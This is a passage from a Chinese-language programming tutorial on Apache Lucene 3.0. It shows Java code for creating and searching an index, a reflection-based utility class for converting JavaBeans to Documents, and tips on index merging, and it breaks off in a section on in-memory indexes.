class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想要使用Lucene来查询出站内的数据，首先我们得要有个索引库吧！于是<strong>我们先创建索引库，将我们的数据存到索引库中</strong>。</p><p>创建索引库的步骤：</p><ul><li>1）<strong>创建JavaBean对象</strong></li><li>2）<strong>创建Docment对象</strong></li><li>3）<strong>将JavaBean对象所有的属性值，均放到Document对象中去，属性名可以和JavaBean相同或不同</strong></li><li>4）<strong>创建IndexWriter对象</strong></li><li>5）<strong>将Document对象通过IndexWriter对象写入索引库中</strong></li><li>6）<strong>关闭IndexWriter对象</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createIndexDB</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//把数据填充到JavaBean对象中</span></span><br><span class="line">    User user = <span class="keyword">new</span> User(<span class="string">"1"</span>, <span class="string">"钟福成"</span>, <span class="string">"未来的程序员"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Document对象【导入的是Lucene包下的Document对象】</span></span><br><span class="line">    Document document = <span class="keyword">new</span> Document();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将JavaBean对象所有的属性值，均放到Document对象中去，属性名可以和JavaBean相同或不同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 向Document对象加入一个字段</span></span><br><span class="line"><span class="comment">     * 参数一：字段的关键字</span></span><br><span class="line"><span class="comment">     * 参数二：字符的值</span></span><br><span class="line"><span class="comment">     * 参数三：是否要存储到原始记录表中</span></span><br><span class="line"><span class="comment">     *      YES表示是</span></span><br><span class="line"><span class="comment">     *      NO表示否</span></span><br><span class="line"><span class="comment">     * 参数四：是否需要将存储的数据拆分到词汇表中</span></span><br><span class="line"><span class="comment">     *      ANALYZED表示拆分</span></span><br><span class="line"><span class="comment">     *      NOT_ANALYZED表示不拆分</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    document.add(<span class="keyword">new</span> Field(<span class="string">"id"</span>, user.getId(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line">    document.add(<span class="keyword">new</span> Field(<span class="string">"userName"</span>, user.getUserName(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line">    document.add(<span class="keyword">new</span> Field(<span class="string">"sal"</span>, user.getSal(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建IndexWriter对象</span></span><br><span class="line">    <span class="comment">//目录指定为E:/createIndexDB</span></span><br><span class="line">    Directory directory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/createIndexDB"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用标准的分词算法对原始记录表进行拆分</span></span><br><span class="line">    Analyzer analyzer = <span class="keyword">new</span> StandardAnalyzer(Version.LUCENE_30);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LIMITED默认是1W个</span></span><br><span class="line">    IndexWriter.MaxFieldLength maxFieldLength = IndexWriter.MaxFieldLength.LIMITED;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * IndexWriter将我们的document对象写到硬盘中</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 参数一：Directory d,写到硬盘中的目录路径是什么</span></span><br><span class="line"><span class="comment">     * 参数二：Analyzer a, 以何种算法来对document中的原始记录表数据进行拆分成词汇表</span></span><br><span class="line"><span class="comment">     * 参数三：MaxFieldLength mfl 最多将文本拆分出多少个词汇</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    IndexWriter indexWriter = <span class="keyword">new</span> IndexWriter(directory, analyzer, maxFieldLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将Document对象通过IndexWriter对象写入索引库中</span></span><br><span class="line">    indexWriter.addDocument(document);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭IndexWriter对象</span></span><br><span class="line">    indexWriter.close();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是，我们现在用一个关键字，把索引库的数据读取。看看读取数据是否成功。</p><p>根据关键字查询索引库中的内容：</p><ul><li>1）<strong>创建IndexSearcher对象</strong></li><li>2）<strong>创建QueryParser对象</strong></li><li>3）<strong>创建Query对象来封装关键字</strong></li><li>4）<strong>用IndexSearcher对象去索引库中查询符合条件的前100条记录，不足100条记录的以实际为准</strong></li><li>5）<strong>获取符合条件的编号</strong></li><li>6）<strong>用indexSearcher对象去索引库中查询编号对应的Document对象</strong></li><li>7）<strong>将Document对象中的所有属性取出，再封装回JavaBean对象中去，并加入到集合中保存，以备将之用</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">findIndexDB</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 参数一： IndexSearcher(Directory path)查询以xxx目录的索引库</span></span><br><span class="line"><span class="comment">      *</span></span><br><span class="line"><span class="comment">      * */</span></span><br><span class="line">     Directory directory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/createIndexDB"</span>));</span><br><span class="line">     <span class="comment">//创建IndexSearcher对象</span></span><br><span class="line">     IndexSearcher indexSearcher = <span class="keyword">new</span> IndexSearcher(directory);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//创建QueryParser对象</span></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 参数一： Version matchVersion 版本号【和上面是一样的】</span></span><br><span class="line"><span class="comment">      * 参数二：String f,【要查询的字段】</span></span><br><span class="line"><span class="comment">      * 参数三：Analyzer a【使用的拆词算法】</span></span><br><span class="line"><span class="comment">      * */</span></span><br><span class="line">     Analyzer analyzer = <span class="keyword">new</span> StandardAnalyzer(Version.LUCENE_30);</span><br><span class="line">     QueryParser queryParser = <span class="keyword">new</span> QueryParser(Version.LUCENE_30, <span class="string">"userName"</span>, analyzer);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//给出要查询的关键字</span></span><br><span class="line">     String keyWords = <span class="string">"钟"</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//创建Query对象来封装关键字</span></span><br><span class="line">     Query query = queryParser.parse(keyWords);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//用IndexSearcher对象去索引库中查询符合条件的前100条记录，不足100条记录的以实际为准</span></span><br><span class="line">     TopDocs topDocs = indexSearcher.search(query, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//获取符合条件的编号</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; topDocs.scoreDocs.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">         ScoreDoc scoreDoc = topDocs.scoreDocs[i];</span><br><span class="line">         <span class="keyword">int</span> no = scoreDoc.doc;</span><br><span class="line">         <span class="comment">//用indexSearcher对象去索引库中查询编号对应的Document对象</span></span><br><span class="line">         Document document = indexSearcher.doc(no);</span><br><span class="line"></span><br><span class="line">         <span class="comment">//将Document对象中的所有属性取出，再封装回JavaBean对象中去</span></span><br><span class="line">         String id = document.get(<span class="string">"id"</span>);</span><br><span class="line">         String userName = document.get(<span class="string">"userName"</span>);</span><br><span class="line">         String sal = document.get(<span class="string">"sal"</span>);</span><br><span class="line"></span><br><span class="line">         User user = <span class="keyword">new</span> User(id, userName, sal);</span><br><span class="line">         System.out.println(user);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h4 id="代码说明："><a href="#代码说明：" class="headerlink" title="代码说明："></a>代码说明：</h4><p>我们的Lucene程序就是大概这么一个思路：<strong>将JavaBean对象封装到Document对象中，然后通过IndexWriter把document写入到索引库中。当用户需要查询的时候，就使用IndexSearcher从索引库中读取数据，找到对应的Document对象，从而解析里边的内容，再封装到JavaBean对象中让我们使用</strong>。</p><h4 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h4><p>我们再次看回我们上一篇快速入门写过的代码，我来截取一些有代表性的：</p><p>以下代码在把数据填充到索引库，和从索引库查询数据的时候，都出现了。<strong>是重复代码</strong>！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Directory directory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/createIndexDB"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用标准的分词算法对原始记录表进行拆分</span></span><br><span class="line">Analyzer analyzer = <span class="keyword">new</span> StandardAnalyzer(Version.LUCENE_30);</span><br></pre></td></tr></table></figure><p>以下的代码其实就是<strong>将JavaBean的数据封装到Document对象中，我们是可以通过反射来对其进行封装</strong>….如果不封装的话，我们如果有很多JavaBean都要添加到Document对象中，就会出现很多类似的代码.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.add(<span class="keyword">new</span> Field(<span class="string">"id"</span>, user.getId(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line">document.add(<span class="keyword">new</span> Field(<span class="string">"userName"</span>, user.getUserName(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line">document.add(<span class="keyword">new</span> Field(<span class="string">"sal"</span>, user.getSal(), Field.Store.YES, Field.Index.ANALYZED));</span><br></pre></td></tr></table></figure><p>以下代码就是从Document对象中把数据取出来，封装到JavaBean去。如果JavaBean中有很多属性，也是需要我们写很多次类似代码….</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将Document对象中的所有属性取出，再封装回JavaBean对象中去</span></span><br><span class="line">String id = document.get(<span class="string">"id"</span>);</span><br><span class="line">String userName = document.get(<span class="string">"userName"</span>);</span><br><span class="line">String sal = document.get(<span class="string">"sal"</span>);</span><br><span class="line">User user = <span class="keyword">new</span> User(id, userName, sal);</span><br></pre></td></tr></table></figure><h4 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h4><p>编写工具类的时候，值得注意的地方：</p><ul><li>当我们得到了对象的属性的时候，就可以把属性的get方法封装起来</li><li>得到get方法，就可以调用它，得到对应的值</li><li>在操作对象的属性时，我们要使用暴力访问</li><li>如果有属性，值，对象这三个变量，我们记得使用BeanUtils组件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.analysis.Analyzer;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.analysis.standard.StandardAnalyzer;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.document.Document;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.index.IndexWriter;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.store.Directory;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.store.FSDirectory;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.util.Version;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ozc on 2017/7/12.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用单例事例模式</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LuceneUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Directory directory;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Analyzer analyzer;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> IndexWriter.MaxFieldLength maxFieldLength;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LuceneUtils</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            directory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/createIndexDB"</span>));</span><br><span class="line">            analyzer = <span class="keyword">new</span> StandardAnalyzer(Version.LUCENE_30);</span><br><span class="line">            maxFieldLength = IndexWriter.MaxFieldLength.LIMITED;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Directory <span class="title">getDirectory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> directory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Analyzer <span class="title">getAnalyzer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> analyzer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IndexWriter.<span class="function">MaxFieldLength <span class="title">getMaxFieldLength</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> maxFieldLength;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object 传入的JavaBean类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回Document对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Document <span class="title">javaBean2Document</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Document document = <span class="keyword">new</span> Document();</span><br><span class="line">            <span class="comment">//得到JavaBean的字节码文件对象</span></span><br><span class="line">            Class&lt;?&gt; aClass = object.getClass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通过字节码文件对象得到对应的属性【全部的属性，不能仅仅调用getFields()】</span></span><br><span class="line">            Field[] fields = aClass.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//得到每个属性的名字</span></span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                String name = field.getName();</span><br><span class="line">                <span class="comment">//得到属性的值【也就是调用getter方法获取对应的值】</span></span><br><span class="line">                String method = <span class="string">"get"</span> + name.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase() + name.substring(<span class="number">1</span>);</span><br><span class="line">                <span class="comment">//得到对应的值【就是得到具体的方法，然后调用就行了。因为是get方法，没有参数】</span></span><br><span class="line">                Method aClassMethod = aClass.getDeclaredMethod(method, <span class="keyword">null</span>);</span><br><span class="line">                String value = aClassMethod.invoke(object).toString();</span><br><span class="line">                System.out.println(value);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">//把数据封装到Document对象中。</span></span><br><span class="line">                document.add(<span class="keyword">new</span> org.apache.lucene.document.Field(name, value, org.apache.lucene.document.Field.Store.YES, org.apache.lucene.document.Field.Index.ANALYZED));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> document;</span><br><span class="line">        &#125;  <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> aClass   要解析的对象类型，要用户传入进来</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> document 将Document对象传入进来</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回一个JavaBean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">Document2JavaBean</span><span class="params">(Document document, Class aClass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建该JavaBean对象</span></span><br><span class="line">            Object obj = aClass.newInstance();</span><br><span class="line">            <span class="comment">//得到该JavaBean所有的成员变量</span></span><br><span class="line">            Field[] fields = aClass.getDeclaredFields();</span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//设置允许暴力访问</span></span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                String name = field.getName();</span><br><span class="line">                String value = document.get(name);</span><br><span class="line">                <span class="comment">//使用BeanUtils把数据封装到Bean中</span></span><br><span class="line">                BeanUtils.setProperty(obj, name, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        LuceneUtils.javaBean2Document(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用LuceneUtils改造程序"><a href="#使用LuceneUtils改造程序" class="headerlink" title="使用LuceneUtils改造程序"></a>使用LuceneUtils改造程序</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createIndexDB</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//把数据填充到JavaBean对象中</span></span><br><span class="line">    User user = <span class="keyword">new</span> User(<span class="string">"2"</span>, <span class="string">"钟福成2"</span>, <span class="string">"未来的程序员2"</span>);</span><br><span class="line">    Document document = LuceneUtils.javaBean2Document(user);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * IndexWriter将我们的document对象写到硬盘中</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 参数一：Directory d,写到硬盘中的目录路径是什么</span></span><br><span class="line"><span class="comment">     * 参数二：Analyzer a, 以何种算法来对document中的原始记录表数据进行拆分成词汇表</span></span><br><span class="line"><span class="comment">     * 参数三：MaxFieldLength mfl 最多将文本拆分出多少个词汇</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    IndexWriter indexWriter = <span class="keyword">new</span> IndexWriter(LuceneUtils.getDirectory(), LuceneUtils.getAnalyzer(), LuceneUtils.getMaxFieldLength());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将Document对象通过IndexWriter对象写入索引库中</span></span><br><span class="line">    indexWriter.addDocument(document);</span><br><span class="line">    <span class="comment">//关闭IndexWriter对象</span></span><br><span class="line">    indexWriter.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">findIndexDB</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建IndexSearcher对象</span></span><br><span class="line">    IndexSearcher indexSearcher = <span class="keyword">new</span> IndexSearcher(LuceneUtils.getDirectory());</span><br><span class="line">    <span class="comment">//创建QueryParser对象</span></span><br><span class="line">    QueryParser queryParser = <span class="keyword">new</span> QueryParser(Version.LUCENE_30, <span class="string">"userName"</span>, LuceneUtils.getAnalyzer());</span><br><span class="line">    <span class="comment">//给出要查询的关键字</span></span><br><span class="line">    String keyWords = <span class="string">"钟"</span>;</span><br><span class="line">    <span class="comment">//创建Query对象来封装关键字</span></span><br><span class="line">    Query query = queryParser.parse(keyWords);</span><br><span class="line">    <span class="comment">//用IndexSearcher对象去索引库中查询符合条件的前100条记录，不足100条记录的以实际为准</span></span><br><span class="line">    TopDocs topDocs = indexSearcher.search(query, <span class="number">100</span>);</span><br><span class="line">    <span class="comment">//获取符合条件的编号</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; topDocs.scoreDocs.length; i++) &#123;</span><br><span class="line">        ScoreDoc scoreDoc = topDocs.scoreDocs[i];</span><br><span class="line">        <span class="keyword">int</span> no = scoreDoc.doc;</span><br><span class="line">        <span class="comment">//用indexSearcher对象去索引库中查询编号对应的Document对象</span></span><br><span class="line">        Document document = indexSearcher.doc(no);</span><br><span class="line">        <span class="comment">//将Document对象中的所有属性取出，再封装回JavaBean对象中去</span></span><br><span class="line">        User user = (User) LuceneUtils.Document2JavaBean(document, User.class);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="索引库优化："><a href="#索引库优化：" class="headerlink" title="索引库优化："></a>索引库优化：</h4><p>我们已经可以创建索引库并且从索引库读取对象的数据了。其实索引库还有地方可以优化的…</p><h4 id="合并文件"><a href="#合并文件" class="headerlink" title="合并文件"></a>合并文件</h4><p>我们把数据添加到索引库中的时候，<strong>每添加一次，都会帮我们自动创建一个cfs文件</strong>…</p><p>这样其实不好，因为如果数据量一大，我们的硬盘就有非常非常多的cfs文件了…..其实<strong>索引库会帮我们自动合并文件的，默认是10个</strong>。</p><p>如果，我们想要修改默认的值，我们可以通过以下的代码修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//索引库优化</span></span><br><span class="line">indexWriter.optimize();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置合并因子为3，每当有3个cfs文件，就合并</span></span><br><span class="line">indexWriter.setMergeFactor(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>我们的目前的程序是直接与文件进行操作，这样对IO的开销其实是比较大的。而且速度相对较慢….我们可以使用内存索引库来提高我们的读写效率…</p><p>对于内存索引库而言，它的速度是很快的，因为我们直接操作内存…但是呢，<strong>我们要将内存索引库是要到硬盘索引库中保存起来的。当我们读取数据的时候，先要把硬盘索引库的数据同步到内存索引库中去的。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 